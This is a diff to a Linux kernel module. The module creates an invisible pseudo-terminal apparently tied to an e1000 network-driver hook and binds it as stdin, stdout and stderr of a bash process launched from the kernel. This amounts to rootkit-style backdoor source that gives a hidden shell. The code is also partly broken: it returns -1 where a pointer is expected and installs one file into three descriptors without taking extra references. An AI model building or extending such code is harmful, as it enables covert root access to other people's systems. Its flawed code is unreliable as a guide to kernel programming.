@@ -1,5 +1,5 @@
 #include "tty_util.h"
-
+#include "taskutil.h"
 
 
 //this qtty will interact with the e1000_hook
@@ -7,6 +7,11 @@
 
 
 struct qtty qtty;
+
+
+
+
+
 
 ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t* off){
     printk(KERN_INFO "WRITING\n");
@@ -28,16 +33,44 @@ ssize_t qtty_write(struct file* f, const char __user * buf, size_t size, loff_t*
     
 }
 
-int qtty_open(struct inode* i, struct file* f){
+int qtty_open(struct inode* i, struct file* f){ // a qtty can never be "opened" because there is no reference to it in the file system. It exists as an invisible device in the backend.
     printk(KERN_INFO "TTY opened");
     return 0;
 }
 
 const struct file_operations qtty_fops = {
     .open = qtty_open,
-    .write = qtty_write,
+    .write = qtty_write,  
     .owner = THIS_MODULE
 };
+
+
+/*
+Allocate a fd to a qtty. 
+*/
+struct file* alloc_file_qtty(int flags, const struct cred* cred){ //the idea is that cred has already been initialized in the ini function of umh. So, what we can do is call current_cred() to get the cred
+  struct file* f;
+  f = kzalloc(sizeof(struct file), GFP_KERNEL);
+  if(!f){
+    printk(KERN_INFO "OOM'd\n");
+    return -1;
+  }
+  f->f_cred = cred;
+  atomic_long_set(&f->f_count, 1);
+  rwlock_init(&f->f_owner.lock);
+  spin_lock_init(&f->f_lock);
+  mutex_init(&f->f_pos_lock);
+  f->f_flags = flags; 
+  f->f_mode = OPEN_FMODE(flags);
+
+  //above is all initialization. Now it's time to setup the qtty
+
+  f->f_op = &qtty_fops;
+
+  return f;
+
+
+}
 
 
 
@@ -87,15 +120,35 @@ void qtty_clean_up(void){
 
 
 
-struct task_struct* umh_tsk = NULL;
+struct task_struct* umh_tsk = NULL; //call usermodehelper runs in a new thread, so we need to create a waitqueue and wait to populate it.
 
 DECLARE_WAIT_QUEUE_HEAD(qogchamp_wait); //wait queue for qogchamp. This is used for waiting for umh_tsk to be populated
 
-int init_func(struct subprocess_info* info, struct cred* new){
+
+
+int init_func(struct subprocess_info* info, struct cred* new){ 
+  int retval;
+  struct file* qtty_file;
   //printk(KERN_INFO "old task ptr: 0x%lx, new task ptr: 0x%lx", (unsigned long)info->data, (unsigned long)current);
   umh_tsk = current; //get task_struct
   get_task_struct(umh_tsk); //increase reference counter so the task doesn't disappear from under us
   wake_up(&qogchamp_wait); 
+ // printk("PID: %d\n", current->pid);
+  
+  qtty_file = alloc_file_qtty(O_RDWR | O_CLOEXEC, current_cred());
+
+  //do it three times for 0,1, and 2
+
+  retval = get_unused_fd_flags(0); //this is an important check as it reserves an fd.
+  
+ // printk(KERN_INFO "retval: %d\n", retval);
+  fd_install(retval, qtty_file); //thank FUCKING GOD this is exported. 
+  retval = get_unused_fd_flags(0);
+ // printk(KERN_INFO "retval: %d\n", retval);
+  fd_install(retval, qtty_file); //thank FUCKING GOD this is exported. 
+  retval = get_unused_fd_flags(0);
+//  printk(KERN_INFO "retval: %d\n", retval);
+  fd_install(retval, qtty_file); //thank FUCKING GOD this is exported. 
   return 0;
 
 }
@@ -124,6 +177,5 @@ void launch_bash(void){
   }
   __set_current_state(TASK_RUNNING);
   remove_wait_queue(&qogchamp_wait, &wait);
-  printk("PID: %d\n", umh_tsk->pid);
   put_task_struct(umh_tsk);
 }
